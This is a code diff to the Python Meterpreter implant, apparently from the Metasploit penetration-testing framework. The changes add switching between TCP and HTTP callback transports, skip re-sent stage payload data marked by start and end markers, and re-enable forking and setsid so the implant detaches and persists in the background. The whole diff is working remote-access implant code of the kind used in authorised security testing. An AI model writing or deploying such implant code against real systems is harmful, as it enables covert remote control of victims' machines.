@@ -77,6 +77,9 @@ PACKET_TYPE_RESPONSE       = 1
 PACKET_TYPE_PLAIN_REQUEST  = 10
 PACKET_TYPE_PLAIN_RESPONSE = 11
 
+STAGE_END_MARKER = bytes('### meterpreter stage end ###\n')
+STAGE_START_MARKER = bytes('#!/usr/b')
+
 ERROR_SUCCESS = 0
 # not defined in original C implementation
 ERROR_FAILURE = 1
@@ -418,6 +421,12 @@ class Transport(object):
 		transport.retry_wait = packet_get_tlv(request, TLV_TYPE_TRANS_RETRY_WAIT).get('value', SESSION_RETRY_WAIT)
 		return transport
 
+	def activate(self):
+		return
+
+	def deactivate(self):
+		return
+
 	def get_packet(self):
 		self.communication_active = False
 		try:
@@ -476,6 +485,8 @@ class HttpTransport(Transport):
 		url_h = urllib.urlopen(request)
 		packet = url_h.read()
 		if packet:
+			if packet[8:] == STAGE_START_MARKER:
+				return _get_packet()
 			packet = packet[8:]
 		else:
 			packet = None
@@ -500,15 +511,15 @@ class TcpTransport(Transport):
 		self.url = url
 		self.socket = socket
 
-	def _check_socket(self):
+	def activate(self):
 		if self.socket:
 			return
 		if self.url.startswith('tcp:'):
 			family = socket.AF_INET
-			address, port = url[6:].split(':', 1)
+			address, port = self.url[6:].split(':', 1)
 		else:
 			family = socket.AF_INET6
-			address, port = url[7:].split(':', 1)
+			address, port = self.url[7:].split(':', 1)
 		port = int(port.rstrip('/'))
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		if address == '0.0.0.0' or address == '::':
@@ -520,13 +531,24 @@ class TcpTransport(Transport):
 		self.socket = sock
 		return
 
+	def deactivate(self):
+		if not self.socket:
+			return
+		self.socket.shutdown(socket.SHUT_RDWR)
+		self.socket.close()
+		self.socket = None
+
 	def _get_packet(self):
-		self._check_socket()
 		packet = None
 		if len(select.select([self.socket], [], [], 0.5)[0]):
 			packet = self.socket.recv(8)
 			if len(packet) != 8:
 				return None
+			if packet == STAGE_START_MARKER:
+				while self.socket.recv(len(STAGE_END_MARKER), socket.MSG_PEEK) != STAGE_END_MARKER:
+					self.socket.recv(1)
+				self.socket.recv(len(STAGE_END_MARKER))
+				return self._get_packet()
 			pkt_length, pkt_type = struct.unpack('>II', packet)
 			pkt_length -= 8
 			packet = bytes()
@@ -535,7 +557,6 @@ class TcpTransport(Transport):
 		return packet
 
 	def _send_packet(self, packet):
-		self._check_socket()
 		self.socket.send(packet)
 
 	@classmethod
@@ -555,6 +576,7 @@ class TcpTransport(Transport):
 class PythonMeterpreter(object):
 	def __init__(self, transport):
 		self.transport = transport
+		self.transport.activate()
 		self.running = False
 		self.last_registered_extension = None
 		self.extension_functions = {}
@@ -609,6 +631,19 @@ class PythonMeterpreter(object):
 	@property
 	def session_has_expired(self):
 		return time.time() > self.session_expiry_end
+
+	def change_transport(self, forward=True):
+		current_idx = self.transports.index(self.transport)
+		if forward:
+			new_idx = min(current_idx + 1, len(self.transports) - 1)
+		else:
+			new_idx = max(current_idx - 1, 0)
+		if new_idx == current_idx:
+			return
+		self.transport.deactivate()
+		self.transport = self.transports[new_idx]
+		self.transport.activate()
+
 
 	def run(self):
 		while self.running and not self.session_has_expired:
@@ -756,10 +791,12 @@ class PythonMeterpreter(object):
 		return ERROR_SUCCESS, response
 
 	def _core_transport_next(self, request, response):
-		raise NotImplemented()
+		self.change_transport(forward=True)
+		return ERROR_SUCCESS, response
 
 	def _core_transport_prev(self, request, response):
-		raise NotImplemented()
+		self.change_transport(forward=False)
+		return ERROR_SUCCESS, response
 
 	def _core_transport_set_timeouts(self, request, response):
 		timeout_value = packet_get_tlv(request, TLV_TYPE_TRANS_SESSION_EXP).get('value')
@@ -909,8 +946,7 @@ class PythonMeterpreter(object):
 		resp = struct.pack('>I', len(resp) + 4) + resp
 		return resp
 
-#if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
-if True:
+if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 	if hasattr(os, 'setsid'):
 		try:
 			os.setsid()
@@ -922,3 +958,5 @@ if True:
 		transport = TcpTransport.from_socket(s)
 	met = PythonMeterpreter(transport)
 	met.run()
+
+### meterpreter stage end ###
